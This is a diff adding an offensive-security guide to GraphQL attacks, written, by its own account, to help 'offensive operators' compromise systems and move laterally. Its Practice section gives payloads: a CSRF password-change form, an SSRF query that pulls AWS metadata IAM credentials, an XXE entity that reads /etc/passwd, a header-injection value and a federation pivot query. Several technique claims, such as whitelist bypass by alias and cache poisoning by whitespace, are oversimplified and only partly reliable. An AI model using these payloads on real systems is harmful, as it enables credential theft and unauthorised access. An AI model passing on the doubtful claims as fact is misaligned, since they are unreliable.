@@ -1,0 +1,195 @@
+---
+title: Advanced GraphQL Injection Techniques Guide
+description: Explore advanced GraphQL injection techniques, including CSRF, SSRF,
+  and XXE attacks, with practical exploitation methods.
+keywords:
+- GraphQL injection
+- CSRF
+- SSRF
+- XXE
+- query chaining
+- cache poisoning
+- header injection
+- response manipulation
+- Apollo Federation
+---
+
+# Advanced Techniques
+
+## Context
+
+The objective of this guide is to enable offensive operators to exploit advanced GraphQL injection techniques for deeper compromise and lateral movement. This requires an understanding of the GraphQL schema structure, how to craft and send GraphQL queries, and the manipulation of HTTP headers. A foundational knowledge of basic GraphQL injection is assumed.
+
+## Theory
+
+### Cross-Site Request Forgery (CSRF) via GraphQL
+
+Cross-Site Request Forgery (CSRF) through GraphQL endpoints involves leveraging browser trust and session cookies to perform unauthorized actions on behalf of an authenticated user. The attacker creates a malicious site that can trigger a GraphQL mutation when visited by a victim. The victim's browser then automatically sends this authenticated request to the target GraphQL endpoint.
+
+### Server-Side Request Forgery (SSRF) via GraphQL Resolvers
+
+SSRF via GraphQL occurs when resolvers that handle user-controlled fields fail to validate inputs properly, allowing an attacker to make arbitrary HTTP requests from the server. This can result in unauthorized access to internal resources or sensitive data.
+
+### XML External Entity (XXE) via GraphQL
+
+XXE attacks exploit XML processors by injecting malicious XML payloads into GraphQL fields that are subsequently parsed by the backend. This can lead to the exposure or exfiltration of sensitive server files or data.
+
+### GraphQL Query Chaining Attacks
+
+GraphQL Query Chaining involves combining multiple queries or mutations in a single request to bypass security measures or escalate the attack's impact. This technique can overcome limitations like query whitelists or rate limits imposed by the server.
+
+### Query Whitelist Bypass
+
+Query Whitelist Bypass is achieved by circumventing static whitelists using methods like query aliases, fragments, or variable manipulation. This evasion technique allows the execution of queries that are not explicitly permitted by the server's security policies.
+
+### GraphQL Cache Poisoning
+
+Cache poisoning in GraphQL is facilitated by manipulating cache keys using obfuscated input values, leading the server to serve malicious or stale data to unsuspecting users. This vulnerability stems from cache mechanisms that fail to normalize or sanitize user input properly.
+
+### GraphQL Header Injection
+
+This technique leverages user input mapped to HTTP headers within a GraphQL context. Improper sanitization of such input can lead to header injection, allowing attackers to manipulate backend communications, escalate privileges, or conduct log poisoning.
+
+### GraphQL Response Manipulation
+
+Altering the server's response through crafted queries enables attackers to mislead client applications or further exploit the server. This might involve manipulating the response structure or data types returned by the GraphQL server.
+
+### Persistent Query Abuse
+
+Persistent Query Abuse involves targeting the mapping between query hashes and their corresponding operations. If this mapping is weak, attackers can execute unauthorized operations by crafting collided hash values.
+
+### Apollo Federation Attacks
+
+Apollo Federation Attacks target federated GraphQL architectures, often exploiting entity resolution or service boundaries to facilitate lateral movement or privilege escalations. By crafting malicious queries, attackers can pivot across federated services.
+
+## Practice
+
+### CSRF via GraphQL Mutation
+
+- **Payload**:
+
+    ```html
+    <form action="https://target.com/graphql" method="POST">
+      <input type="hidden" name="query" value="mutation { changePassword(newPassword: \"hacked\") }" />
+      <input type="submit" />
+    </form>
+    ```
+
+- Host this form on an attacker-controlled website. The victim must visit the site while authenticated to execute the unauthorized GraphQL mutation using their session.
+
+**Outcome**: Victim's session is used to execute unauthorized GraphQL mutations, potentially changing sensitive application data.
+
+### SSRF via User-Controlled Resolver Field
+
+- **Payload**:
+
+    ```graphql
+    {
+        fetchUrl(url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/")
+    }
+    ```
+
+- This payload takes advantage of a resolver accepting user-supplied URLs to access sensitive internal endpoints.
+
+**Outcome**: Access to internal metadata or protected resources is achieved through the backend's HTTP request behavior.
+
+### XXE via GraphQL Variable
+
+- **Payload**:
+
+    ```graphql
+    {
+        uploadXml(xml: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>")
+    }
+    ```
+
+- This payload injects an XXE payload into a GraphQL variable processed by an XML parser, leading to potential file exfiltration.
+
+**Outcome**: Sensitive server files or data are exfiltrated via the XML parsing process.
+
+### Query Whitelist Bypass Using Aliases
+
+- **Payload**:
+
+    ```graphql
+    {
+        a: user(id:1) { username }
+    }
+    ```
+
+- By using an alias, this query bypasses static query whitelisting mechanisms.
+
+**Outcome**: Execution of non-whitelisted queries becomes possible, bypassing server-side input validation.
+
+### GraphQL Cache Poisoning via Variable Manipulation
+
+- **Payload**:
+
+    ```graphql
+    {
+        user(id: "1 ") { username }
+    }
+    ```
+
+- Whitespace manipulation in the cache key results in discrepancies, thus poisoning the cache.
+
+**Outcome**: Users are served malicious or outdated data due to cache key mismatches.
+
+### Header Injection via GraphQL Variable
+
+- **Payload**:
+
+    ```graphql
+    {
+        setHeader(name: "X-Forwarded-For\nInjected: evil", value: "test")
+    }
+    ```
+
+- This payload exploits newline injection to introduce additional headers in backend HTTP requests.
+
+**Outcome**: Backend HTTP headers are manipulated, leading to privilege escalation or log-related attacks.
+
+### Response Manipulation via Type Confusion
+
+- **Payload**:
+
+    ```graphql
+    {
+        user(id:1) { ... on Admin { secret } ... on User { username } }
+    }
+    ```
+
+- This query manipulates response structure, leveraging type confusion to potentially leak sensitive data.
+
+**Outcome**: Unauthorized data fields are accessed or the client is presented with misleading response data.
+
+### Persistent Query Abuse via Hash Collision
+
+- **Payload**:
+
+    - Send a persisted query with a hash matching a privileged operation.
+
+- **Explanation**: This involves abusing weak hash mappings to execute privileged operations without the client’s consent.
+
+**Outcome**: Unauthorized operations are executed via hash collisions.
+
+### Apollo Federation Pivot via Entity Resolution
+
+- **Payload**:
+
+    ```graphql
+    {
+        _entities(representations: [{__typename: "User", id: "1"}]) { ... on User { username email } }
+    }
+    ```
+
+- This query exploits federated entity resolution to gain cross-service data access.
+
+**Outcome**: The attacker can perform lateral movement or escalate privileges across federated GraphQL services.
+
+## Tools
+
+- **Burp Suite**
+- **GraphQL Voyager**
+- **InQL**
+- **Postman**
